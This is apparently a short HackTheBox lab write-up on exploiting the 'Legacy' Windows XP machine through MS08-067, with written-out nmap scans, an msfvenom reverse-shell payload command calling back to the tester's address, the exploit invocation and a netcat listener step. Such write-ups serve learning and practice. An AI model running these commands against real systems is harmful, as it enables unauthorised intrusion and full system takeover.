---
title: "HackTheBox - WriteUp 21"
date: 2019-06-14T14:07:30+08:00
description: "HackTheBox 练手 - Legacy MS08-067"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Legacy

As the name suggests, Running a Legacy Windows XP.

Nmap Scan using: `nmap -A -O -Pn -p1-65535 -oN legacy.namp 10.10.10.4`, Found: 139,445 without workgroup listing permission.

## Root

Do more precise OS system version detection: `nmap -p 139,445 --script-args=usafe=1 --script smb-os-discovery -oN detectos.nmap 10.10.10.4`.

As for old OS, just think about ms08-067, here we found it: https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py

Generate payload: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.80 LPORT=15500 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows > shellcode`

Modify the payload inside Python script, Then run: `python2 ./ms08-067.py 10.10.10.4 7 445`

Don't forget to setup netcat on Port 15500. You'll get a `NT AUTHORITY\SYSTEM` shell.

# Safe


